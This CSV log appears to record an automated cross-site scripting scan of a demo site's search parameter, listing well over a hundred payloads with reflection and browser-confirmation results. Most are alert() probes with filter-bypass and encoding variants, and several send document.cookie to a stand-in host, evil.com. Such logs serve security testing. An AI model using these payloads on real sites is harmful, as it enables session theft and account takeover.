Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:53.951,2026-01-10 17:58:54.804,0.853,https://demo-knsl.onrender.com/search,GET,q,<img src=x oncontextmenu=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:54.701,2026-01-10 17:58:54.839,0.138,https://demo-knsl.onrender.com/search,GET,q,<img src=x onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.737,2026-01-10 17:58:54.851,0.113,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.783,2026-01-10 17:58:54.902,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowenter=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.782,2026-01-10 17:58:54.902,0.121,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizestart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.788,2026-01-10 17:58:54.907,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowexit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.792,2026-01-10 17:58:54.907,0.114,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsdelete=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.804,2026-01-10 17:58:54.913,0.108,https://demo-knsl.onrender.com/search,GET,q,<img src=x onrowsinserted=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.839,2026-01-10 17:58:54.950,0.111,https://demo-knsl.onrender.com/search,GET,q,<img src=x onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.851,2026-01-10 17:58:54.956,0.105,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.902,2026-01-10 17:58:55.002,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectionchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.902,2026-01-10 17:58:55.003,0.101,https://demo-knsl.onrender.com/search,GET,q,<img src=x onselectstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.907,2026-01-10 17:58:55.023,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.907,2026-01-10 17:58:55.026,0.119,https://demo-knsl.onrender.com/search,GET,q,<img src=x onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.168,2026-01-10 17:58:55.037,0.869,https://demo-knsl.onrender.com/search,GET,q,<img src=x ondragleave=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:54.913,2026-01-10 17:58:55.049,0.136,https://demo-knsl.onrender.com/search,GET,q,<img src=x onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.950,2026-01-10 17:58:55.051,0.101,https://demo-knsl.onrender.com/search,GET,q,<img src=x onunload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.002,2026-01-10 17:58:55.107,0.105,https://demo-knsl.onrender.com/search,GET,q,javascript:alert('XSS'),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.003,2026-01-10 17:58:55.129,0.126,https://demo-knsl.onrender.com/search,GET,q,javascript:prompt(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.023,2026-01-10 17:58:55.129,0.106,https://demo-knsl.onrender.com/search,GET,q,javascript:confirm(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.026,2026-01-10 17:58:55.137,0.112,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.037,2026-01-10 17:58:55.149,0.112,https://demo-knsl.onrender.com/search,GET,q,"data:text/html,<img src=x onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.049,2026-01-10 17:58:55.151,0.103,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.051,2026-01-10 17:58:55.175,0.124,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.107,2026-01-10 17:58:55.225,0.118,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.129,2026-01-10 17:58:55.253,0.124,https://demo-knsl.onrender.com/search,GET,q,<q/ondrop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.129,2026-01-10 17:58:55.253,0.124,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.137,2026-01-10 17:58:55.258,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.149,2026-01-10 17:58:55.268,0.119,https://demo-knsl.onrender.com/search,GET,q,<q/oninput=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.151,2026-01-10 17:58:55.277,0.125,https://demo-knsl.onrender.com/search,GET,q,<q/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.175,2026-01-10 17:58:55.277,0.102,https://demo-knsl.onrender.com/search,GET,q,<q/onmove=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.225,2026-01-10 17:58:55.335,0.109,https://demo-knsl.onrender.com/search,GET,q,<q/onpaste=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.258,2026-01-10 17:58:55.368,0.110,https://demo-knsl.onrender.com/search,GET,q,<q/onscroll=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.253,2026-01-10 17:58:55.368,0.116,https://demo-knsl.onrender.com/search,GET,q,<q/onresize=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.253,2026-01-10 17:58:55.373,0.121,https://demo-knsl.onrender.com/search,GET,q,<q/onreset=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.268,2026-01-10 17:58:55.374,0.106,https://demo-knsl.onrender.com/search,GET,q,<q/onselect=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.277,2026-01-10 17:58:55.379,0.102,https://demo-knsl.onrender.com/search,GET,q,<q/onstop=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.523,2026-01-10 17:58:55.379,0.855,https://demo-knsl.onrender.com/search,GET,q,<img src=x onmouseout=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:55.277,2026-01-10 17:58:55.383,0.107,https://demo-knsl.onrender.com/search,GET,q,<q/onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.335,2026-01-10 17:58:55.452,0.117,https://demo-knsl.onrender.com/search,GET,q,<q/onsubmit=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.368,2026-01-10 17:58:55.481,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.373,2026-01-10 17:58:55.481,0.108,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.379,2026-01-10 17:58:55.486,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.374,2026-01-10 17:58:55.486,0.112,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.379,2026-01-10 17:58:55.491,0.112,https://demo-knsl.onrender.com/search,GET,q,alert(1),RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.383,2026-01-10 17:58:55.493,0.110,https://demo-knsl.onrender.com/search,GET,q,</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.452,2026-01-10 17:58:55.569,0.118,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.481,2026-01-10 17:58:55.586,0.105,https://demo-knsl.onrender.com/search,GET,q,<svg,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.481,2026-01-10 17:58:55.586,0.105,https://demo-knsl.onrender.com/search,GET,q,onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.491,2026-01-10 17:58:55.618,0.127,https://demo-knsl.onrender.com/search,GET,q,<SCRIPT>alert(1)</SCRIPT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.486,2026-01-10 17:58:55.618,0.132,https://demo-knsl.onrender.com/search,GET,q,<ScRiPt>alert(1)</ScRiPt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.775,2026-01-10 17:58:55.619,0.844,https://demo-knsl.onrender.com/search,GET,q,<img src=x onresizeend=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 17:58:55.486,2026-01-10 17:58:55.621,0.135,https://demo-knsl.onrender.com/search,GET,q,<sCrIpT>alert(1)</sCrIpT>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.493,2026-01-10 17:58:55.621,0.128,https://demo-knsl.onrender.com/search,GET,q,<IMG SRC=x ONERROR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.586,2026-01-10 17:58:55.703,0.116,https://demo-knsl.onrender.com/search,GET,q,<SvG oNlOaD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.569,2026-01-10 17:58:55.707,0.138,https://demo-knsl.onrender.com/search,GET,q,<ImG sRc=x OnErRoR=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.619,2026-01-10 17:58:55.730,0.111,https://demo-knsl.onrender.com/search,GET,q,< svg onload=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.621,2026-01-10 17:58:55.735,0.113,https://demo-knsl.onrender.com/search,GET,q,<<script>script>alert(1)<</script>/script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.621,2026-01-10 17:58:55.735,0.114,https://demo-knsl.onrender.com/search,GET,q,<scr<script>ipt>alert(1)</scr</script>ipt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.618,2026-01-10 17:58:55.739,0.121,https://demo-knsl.onrender.com/search,GET,q,< script >alert(1)< / script >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.618,2026-01-10 17:58:55.739,0.121,https://demo-knsl.onrender.com/search,GET,q,< img src=x onerror=alert(1) >,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:54.956,2026-01-10 17:58:55.797,0.841,https://demo-knsl.onrender.com/search,GET,q,javascript:alert(1),RAW_REFLECTION,No,,High
2026-01-10 17:58:55.703,2026-01-10 17:58:55.855,0.152,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x""onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.735,2026-01-10 17:58:55.862,0.127,https://demo-knsl.onrender.com/search,GET,q,%3Cscript%3Ealert(1)%3C/script%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.739,2026-01-10 17:58:55.864,0.125,https://demo-knsl.onrender.com/search,GET,q,%3Csvg%20onload=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.735,2026-01-10 17:58:55.870,0.135,https://demo-knsl.onrender.com/search,GET,q,%3Cimg%20src=x%20onerror=alert(1)%3E,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.739,2026-01-10 17:58:55.872,0.133,https://demo-knsl.onrender.com/search,GET,q,<script>alert`1`</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.707,2026-01-10 17:58:55.875,0.168,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.586,2026-01-10 17:58:55.878,0.291,https://demo-knsl.onrender.com/search,GET,q,<SVG ONLOAD=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.797,2026-01-10 17:58:55.896,0.100,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.855,2026-01-10 17:58:55.977,0.122,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.730,2026-01-10 17:58:56.003,0.272,https://demo-knsl.onrender.com/search,GET,q,<svg//onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.862,2026-01-10 17:58:56.030,0.168,https://demo-knsl.onrender.com/search,GET,q,<script>/**/alert(1)/**/</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.875,2026-01-10 17:58:56.030,0.154,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(""alert(1)"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.870,2026-01-10 17:58:56.030,0.160,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=/**/alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.864,2026-01-10 17:58:56.031,0.166,https://demo-knsl.onrender.com/search,GET,q,<script><!---->alert(1)<!----></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.872,2026-01-10 17:58:56.036,0.164,https://demo-knsl.onrender.com/search,GET,q,<script>eval('alert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.878,2026-01-10 17:58:56.036,0.158,https://demo-knsl.onrender.com/search,GET,q,<script>eval(atob('YWxlcnQoMSk='))</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.003,2026-01-10 17:58:56.121,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.030,2026-01-10 17:58:56.147,0.117,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.030,2026-01-10 17:58:56.147,0.117,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=Function('alert(1)')()>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.030,2026-01-10 17:58:56.155,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>new Function('alert(1)')()</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.036,2026-01-10 17:58:56.155,0.119,https://demo-knsl.onrender.com/search,GET,q,"<img src=x onerror=setTimeout('alert(1)',0)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.036,2026-01-10 17:58:56.162,0.126,https://demo-knsl.onrender.com/search,GET,q,"<script>setInterval('alert(1)',0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.031,2026-01-10 17:58:56.162,0.132,https://demo-knsl.onrender.com/search,GET,q,"<script>setTimeout(""alert(1)"",0)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.368,2026-01-10 17:58:56.198,0.830,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1),RAW_REFLECTION,No,,High
2026-01-10 17:58:56.121,2026-01-10 17:58:56.246,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>location='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.147,2026-01-10 17:58:56.256,0.109,https://demo-knsl.onrender.com/search,GET,q,<script>location.href='javascript:alert(1)'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.977,2026-01-10 17:58:56.260,0.283,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.155,2026-01-10 17:58:56.266,0.111,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061lert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.155,2026-01-10 17:58:56.280,0.125,https://demo-knsl.onrender.com/search,GET,q,<script>\u0061\u006C\u0065\u0072\u0074(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.162,2026-01-10 17:58:56.280,0.118,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61lert(1)')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.162,2026-01-10 17:58:56.293,0.131,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=\u0061lert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.198,2026-01-10 17:58:56.305,0.107,https://demo-knsl.onrender.com/search,GET,q,<script>eval('\x61\x6C\x65\x72\x74\x28\x31\x29')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:55.896,2026-01-10 17:58:56.348,0.452,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval('alert(1)')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.266,2026-01-10 17:58:56.382,0.116,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<svg onload=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.256,2026-01-10 17:58:56.383,0.127,https://demo-knsl.onrender.com/search,GET,q,"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.280,2026-01-10 17:58:56.385,0.105,https://demo-knsl.onrender.com/search,GET,q,<a href=javascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.260,2026-01-10 17:58:56.388,0.128,https://demo-knsl.onrender.com/search,GET,q,<script>document.write('<img src=x onerror=alert(1)>')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.147,2026-01-10 17:58:56.396,0.250,https://demo-knsl.onrender.com/search,GET,q,"<script>location=String.fromCharCode(106,97,118,97,115,99,114,105,112,116,58,97,108,101,114,116,40,49,41)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.280,2026-01-10 17:58:56.404,0.124,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.305,2026-01-10 17:58:56.431,0.126,https://demo-knsl.onrender.com/search,GET,q,<a href='javascript:alert(1)'>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.348,2026-01-10 17:58:56.465,0.117,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#x61vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.383,2026-01-10 17:58:56.497,0.113,https://demo-knsl.onrender.com/search,GET,q,<form><button formaction=javascript:alert(1)>X</button></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.246,2026-01-10 17:58:56.497,0.251,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(String.fromCharCode(88,83,83))</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.382,2026-01-10 17:58:56.500,0.118,https://demo-knsl.onrender.com/search,GET,q,<a href=j&#97vascript:alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.388,2026-01-10 17:58:56.509,0.121,https://demo-knsl.onrender.com/search,GET,q,<form><input type=submit formaction=javascript:alert(1) value=X></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.396,2026-01-10 17:58:56.509,0.113,https://demo-knsl.onrender.com/search,GET,q,<base href=javascript:alert(1)//>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.404,2026-01-10 17:58:56.516,0.112,https://demo-knsl.onrender.com/search,GET,q,"<script>import('data:text/javascript,alert(1)')</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.431,2026-01-10 17:58:56.552,0.121,https://demo-knsl.onrender.com/search,GET,q,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.497,2026-01-10 17:58:56.590,0.094,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable onblur=alert(1)>test</div>,NO_REFLECTION,No,,Info
2026-01-10 17:58:56.509,2026-01-10 17:58:56.591,0.082,https://demo-knsl.onrender.com/search,GET,q,<svg><animatemotion onbegin=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:58:56.497,2026-01-10 17:58:56.623,0.127,https://demo-knsl.onrender.com/search,GET,q,<div draggable=true ondrag=alert(1)>test</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.509,2026-01-10 17:58:56.639,0.130,https://demo-knsl.onrender.com/search,GET,q,<svg><set onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.500,2026-01-10 17:58:56.639,0.139,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.516,2026-01-10 17:58:56.648,0.131,https://demo-knsl.onrender.com/search,GET,q,<svg><animatetransform onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.590,2026-01-10 17:58:56.663,0.073,https://demo-knsl.onrender.com/search,GET,q,<math><maction actiontype=toggle onclick=alert(1)>X</maction></math>,NO_REFLECTION,No,,Info
2026-01-10 17:58:56.552,2026-01-10 17:58:56.664,0.113,https://demo-knsl.onrender.com/search,GET,q,<svg><discard onbegin=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.591,2026-01-10 17:58:56.708,0.117,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<img src=x onerror=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.623,2026-01-10 17:58:56.846,0.222,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<script>alert(1)</script>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.639,2026-01-10 17:58:56.939,0.300,https://demo-knsl.onrender.com/search,GET,q,<img name=alert src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.639,2026-01-10 17:58:56.941,0.302,https://demo-knsl.onrender.com/search,GET,q,"<iframe srcdoc=""<svg onload=alert(1)>""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.663,2026-01-10 17:58:56.946,0.282,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.648,2026-01-10 17:58:56.948,0.300,https://demo-knsl.onrender.com/search,GET,q,<form name=alert><input type=submit onclick=alert(1)></form>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.708,2026-01-10 17:58:56.951,0.243,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=this.src='http://evil.com?c='+document.cookie>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.664,2026-01-10 17:58:56.952,0.288,https://demo-knsl.onrender.com/search,GET,q,<script>fetch('http://evil.com?c='+document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.846,2026-01-10 17:58:56.975,0.130,https://demo-knsl.onrender.com/search,GET,q,<svg onload=fetch('http://evil.com?c='+document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.939,2026-01-10 17:58:57.052,0.113,https://demo-knsl.onrender.com/search,GET,q,<script>document.body.innerHTML+=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.948,2026-01-10 17:58:57.052,0.104,https://demo-knsl.onrender.com/search,GET,q,<body/onpopstate=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.293,2026-01-10 17:58:57.055,0.762,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">X</a>",RAW_REFLECTION,No,,High
2026-01-10 17:58:56.946,2026-01-10 17:58:57.057,0.111,https://demo-knsl.onrender.com/search,GET,q,<body/onhashchange=alert(1)><a href=#x>clickme</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.941,2026-01-10 17:58:57.063,0.122,https://demo-knsl.onrender.com/search,GET,q,<script>document.getElementById('x').innerHTML='<img src=x onerror=alert(1)>'</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.975,2026-01-10 17:58:57.068,0.093,https://demo-knsl.onrender.com/search,GET,q,<body/onstorage=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.952,2026-01-10 17:58:57.085,0.133,https://demo-knsl.onrender.com/search,GET,q,<body/onpagehide=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.052,2026-01-10 17:58:57.153,0.101,https://demo-knsl.onrender.com/search,GET,q,<script><![CDATA[alert(1)]]></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.057,2026-01-10 17:58:57.156,0.099,https://demo-knsl.onrender.com/search,GET,q,"<?xml-stylesheet type=""text/xsl"" href=""javascript:alert(1)""?>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.055,2026-01-10 17:58:57.160,0.105,https://demo-knsl.onrender.com/search,GET,q,"<?xml version=""1.0""?><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.052,2026-01-10 17:58:57.163,0.110,https://demo-knsl.onrender.com/search,GET,q,<script>new WebSocket('ws://evil.com').onopen=alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.063,2026-01-10 17:58:57.169,0.106,https://demo-knsl.onrender.com/search,GET,q,﻿<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:56.385,2026-01-10 17:58:57.172,0.787,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X></form>,RAW_REFLECTION,No,,High
2026-01-10 17:58:56.951,2026-01-10 17:58:57.183,0.232,https://demo-knsl.onrender.com/search,GET,q,<body/onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.085,2026-01-10 17:58:57.189,0.104,https://demo-knsl.onrender.com/search,GET,q,<track src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.172,2026-01-10 17:58:57.225,0.053,https://demo-knsl.onrender.com/search,GET,q,<button autofocus onfocus=alert(1)>X</button>,NO_REFLECTION,No,,Info
